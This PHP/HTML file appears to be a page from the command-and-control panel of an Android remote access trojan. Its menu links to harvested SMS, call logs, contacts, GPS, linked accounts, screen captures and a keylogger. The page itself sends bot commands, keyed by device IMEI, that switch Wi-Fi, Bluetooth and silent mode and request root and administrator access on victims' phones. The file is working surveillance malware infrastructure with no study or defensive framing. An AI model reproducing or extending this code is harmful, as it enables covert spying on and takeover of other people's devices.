<?php

session_start();

if ( isset( $_SESSION['user_id'] ) ) {

} else {
	       header("Location: ../index.php");

}
?>
<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
	<title>Laboratory</title>

	<!-- Normalize V8.0.1 -->
	<link rel="stylesheet" href="../css/normalize.css">

	<!-- Bootstrap V4.3 -->
	<link rel="stylesheet" href="../css/bootstrap.min.css">

	<!-- Bootstrap Material Design V4.0 -->
	<link rel="stylesheet" href="../css/bootstrap-material-design.min.css">

	<!-- Font Awesome V5.9.0 -->
	<link rel="stylesheet" href="../css/all.css">

	<!-- Sweet Alerts V8.13.0 CSS file -->
	<link rel="stylesheet" href="../css/sweetalert2.min.css">

	<!-- Sweet Alert V8.13.0 JS file-->
	<script src="../js/sweetalert2.min.js" ></script>

	<!-- jQuery Custom Content Scroller V3.1.5 -->
	<link rel="stylesheet" href="../css/jquery.mCustomScrollbar.css">
	
	<!-- General Styles -->
	<link rel="stylesheet" href="../css/style.css">


</head>
<body>
<style>
.example_c {
color: #494949 !important;
text-transform: uppercase;
text-decoration: none;
background: #01d28e;
padding: 10px;
border: 3px solid #494949 !important;
display: inline-block;
transition: all 0.4s ease 0s;
}
.example_c:hover {
color: #ffffff !important;
background: #f0134d;
border-color: #f0134d !important;
transition: all 0.4s ease 0s;
}

#snackbar {
  visibility: hidden;
  min-width: 250px;
  margin-left: -125px;
  background-color: #f34573;
  color: #fff;
  text-align: center;
  border-radius: 2px;
  padding: 14px;
  position: fixed;
  z-index: 1;
  left: 50%;
  bottom: 30px;
  font-size: 17px;
}

#snackbar.show {
  visibility: visible;
  -webkit-animation: fadein 0.5s, fadeout 0.5s 2.5s;
  animation: fadein 0.5s, fadeout 0.5s 2.5s;
}

@-webkit-keyframes fadein {
  from {bottom: 0; opacity: 0;} 
  to {bottom: 30px; opacity: 1;}
}

@keyframes fadein {
  from {bottom: 0; opacity: 0;}
  to {bottom: 30px; opacity: 1;}
}

@-webkit-keyframes fadeout {
  from {bottom: 30px; opacity: 1;} 
  to {bottom: 0; opacity: 0;}
}

@keyframes fadeout {
  from {bottom: 30px; opacity: 1;}
  to {bottom: 0; opacity: 0;}
}
</style>
	
	<!-- Main container -->
	<main class="full-box main-container">
		<!-- Nav lateral -->
		<section class="full-box nav-lateral">
			<div class="full-box nav-lateral-bg show-nav-lateral"></div>
			<div class="full-box nav-lateral-content">
              <nav class="full-box nav-lateral-menu">
					<ul>
				<li>
							<a href="home.php"><i class="fab fa-dashcube fa-fw"></i> &nbsp; Dashboard</a>
						</li>
						</ul>
						</nav>					
			<div class="full-box nav-lateral-bar"></div>
				<nav class="full-box nav-lateral-menu">
					<ul>
				<li>
							<a href="#" class="nav-btn-submenu"><i class="fas fa-radiation-alt"></i> &nbsp; Miscellaneous <i class="fas fa-chevron-down"></i></a>
							<ul>
								<li><a href="../zathura/Devinfo.php"><i class="fas fa-mobile-alt fa-fw"></i> &nbsp; Device Info</a></li>
								<li><a href="inboxsms.php"><i class="fas fa-boxes fa-inbox"></i> &nbsp; Inbox Messages</a></li>
								<li><a href="calogs.php"><i class="fas fa-phone-square-alt fa-fw"></i> &nbsp; Call Logs</a></li>
								<li><a href="../zathura/contacts.php"><i class="fas fa-id-badge fa-fw"></i> &nbsp; Contacts</a></li>
								<li><a href="gps.php"><i class="fas fa-map fa-fw"></i> &nbsp; GPS</a></li>
							   <li><a href="accounts.php"><i class="fas fa-user-alt"></i> &nbsp; Linked Accounts </a></li>


								
							</ul>
						</li>
						<li>
							<a href="#" class="nav-btn-submenu"><i class="fas fa-subscript fa-fw"></i> &nbsp; Loggers <i class="fas fa-chevron-down"></i></a>
							<ul>
								<li><a href="../zathura/screenlog.php"><i class="fas fa-desktop fa-fw"></i> &nbsp; Screen Logger</a></li>
								<li><a href="../zathura/snapshot.php"><i class="fas fa-expand fa-fw"></i> &nbsp; SnapShots</a></li>
								<li><a href="keystrokes.php"><i class="fab fa-twitch"></i> &nbsp; Key Logger</a></li>

							</ul>
						</li>
						
						<li>
						   <a href="../zathura/rogue.php"><i class="fab fa-battle-net"></i></i> &nbsp; Rogue</a>

							<ul>

							</ul>
						</li>
						

						<li>
						   <a href="../zathura/toggle.php"><i class="fas fa-bolt"></i> &nbsp; Toggle</a>

							<ul>


							</ul>
						</li>
                           
						   
						

                        <li>
							<a href="#" class="nav-btn-submenu"><i class="fab fa-gitkraken fa-fw"></i> &nbsp; Command <i class="fas fa-chevron-down"></i></a>
							<ul>

							<li><a href="../zathura/status.php"><i class="fab fa-hubspot fa-fw"></i> &nbsp; Status</a></li>
								<li><a href="../zathura/history.php"><i class="fab fa-buffer fa-fw"></i> &nbsp; History</a></li>
								
						
							</ul>
				</nav>
			</div>
		</section>

		<!-- Page content -->
		<section class="full-box page-content">
			<nav class="full-box navbar-info">
				
				<a href="index.php" class="btn-exit-system"><i class="fas fa-power-off"></i></a>
			</nav>

			<!-- Page header -->
			<div class="full-box page-header">
				<h3 class="text-left">
					<i class="fab fa-atlassian"></i> &nbsp; Android Service Toggler
				</h3>
				<p class="text-justify">
				</p>
			</div>

		
			<!-- Content here-->
			<div class="container-fluid">
				<form action="" class="form-neon" autocomplete="off">
					<fieldset>
						<legend><i class="fas fa-bolt"></i> &nbsp; Enable/Disable Network Services.</legend>
						<div class="container-fluid">
							<div class="row">
								<div class="col-12 col-md-6">
								
                             <br>
                           <br>
						   <br>
								<nav class="full-box nav-lateral-menu">
					<ul>
					<li>
					<?php
      
                   	$content =  file_get_contents("../config.txt");

                   ?>
							<a href="#" class="nav-btn-submenu"><i class=""></i> &nbsp; ----Command Executor---- <i class="fas fa-chevron-down"></i></a>
							<ul>
							
										<script type="text/javascript">
                               var wifi0 = "Ewii";
							    var blue0 = "Eblue";
								var esil = "ESil"; 
						        var dsil = "DSil";
								var Dblue = "Dblue";
								var dwifi = "Dwii";
                               var app = "Fclog";
                               var toast = "Fclog";
                               var root = "Groot";
                               var admin = "GADMIN";
							   var imei = "<?php echo $content; ?>";

							   
                                      </script>

	                     	<li><a href="#" onclick="command(imei,wifi0)"><i <i class="fab fa-audible"></i> &nbsp; Enable Wireless</a></li>
							<li><a href="#" onclick="command(imei,blue0)"><i <i class="fas fa-blog"></i> &nbsp; Enable Bluetooth</a></li>
							<li><a href="#" onclick="command(imei,esil)"><i class="fas fa-volume-off"></i> &nbsp; Enable Silent Mode</a></li>
							<li><a href="#" onclick="command(imei,dwifi)"><i <i class="fas fa-wifi"></i> &nbsp; Disable Wireless</a></li>
						<li><a href="#" onclick="command(imei,Dblue)"><i class="fab fa-bluetooth-b"></i> &nbsp; Disable Bluetooth</a></li>
					<li><a href="#" onclick="command(imei,dsil)"><i class="fas fa-volume-up"></i> &nbsp; Disable Silent Mode</a></li>
					<li><a href="#" onclick="command(imei,root)"><i class="fas fa-terminal"></i> &nbsp; Request Root Access</a></li>
					<li><a href="#" onclick="command(imei,admin)"><i class="fas fa-hashtag"></i> &nbsp; Request Administrator Access</a></li>

							</ul>
						</li>
						</ul>
						</nav>

						<br>
						
						<br>
                                    <div id="snackbar">Command Sent </div>


							
								<div class="col-12 col-md-4">
									<div class="form-group">
									<br>
						
									</div>
								</div>
							</div>
						</div>
					</fieldset>
					<br><br><br>
					<fieldset>
					
					</fieldset>
					<br><br><br>
					<fieldset>
						
						
					</fieldset>
					
				</form>
			</div>	

		</section>

		<!-- Help Modal -->
		<div class="modal fade" id="ModalHelp" tabindex="-1" role="dialog" aria-labelledby="ModalHelpTitle" aria-hidden="true">
			<div class="modal-dialog modal-dialog-centered" role="document">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title roboto-medium text-center" id="exampleModalLongTitle">Modal title</h5>
						<button type="button" class="close" data-dismiss="modal" aria-label="Close">
							<span aria-hidden="true">&times;</span>
						</button>
					</div>
				
				<div class="modal-footer">
					<button type="button" class="btn btn-light roboto-condensed-regular" data-dismiss="modal">Close</button>
					&nbsp;
					<button type="button" class="btn btn-light roboto-condensed-regular">Save changes</button>
				</div>
				</div>
			</div>
		</div>
	</main>
	
	
	<!--=============================================
	=            Include JavaScript files           =
	==============================================-->
	<!-- jQuery V3.4.1 -->
	<script src="../js/jquery-3.4.1.min.js" ></script>

	<!-- popper -->
	<script src="../js/popper.min.js" ></script>

	<!-- Bootstrap V4.3 -->
	<script src="../js/bootstrap.min.js" ></script>

	<!-- jQuery Custom Content Scroller V3.1.5 -->
	<script src="../js/jquery.mCustomScrollbar.concat.min.js" ></script>

	<!-- Bootstrap Material Design V4.0 -->
	<script src="../js/bootstrap-material-design.min.js" ></script>
	<script>$(document).ready(function() { $('body').bootstrapMaterialDesign(); });</script>

	<script src="../js/main.js" ></script>
<script>
function stateChange(newState) {
    setTimeout(function(){
        if(newState == -1){
				document.location.reload(true);}
    }, 800);
}
</script>
	<script>
	a.button5{
display:inline-block;
padding:0.46em 1.6em;
border:0.1em solid #000000;
margin:0 0.2em 0.2em 0;
border-radius:0.12em;
box-sizing: border-box;
text-decoration:none;
font-family:'Roboto',sans-serif;
font-weight:300;
color:#000000;
text-shadow: 0 0.04em 0.04em rgba(0,0,0,0.35);
background-color:#FFFFFF;
text-align:center;
transition: all 0.15s;
}
a.button5:hover{
text-shadow: 0 0 2em rgba(255,255,255,1);
color:#FFFFFF;
border-color:#FFFFFF;
}
@media all and (max-width:30em){
a.button5{
display:block;
margin:0.4em auto;
}
}

</script>

								   <script>
                               function command(imei,meow) { 
										
                                   var x = document.getElementById("snackbar");
                              x.className = "show";
                                setTimeout(function(){ x.className = x.className.replace("show", ""); }, 670);
						      stateChange(-1);

								  $.post('../zathura/bot_command.php', { imei: imei,command: meow , function(data) { 
                                   console.log(data); 
								
                                 }});
                                 }
                                     </script>
</body>
</html>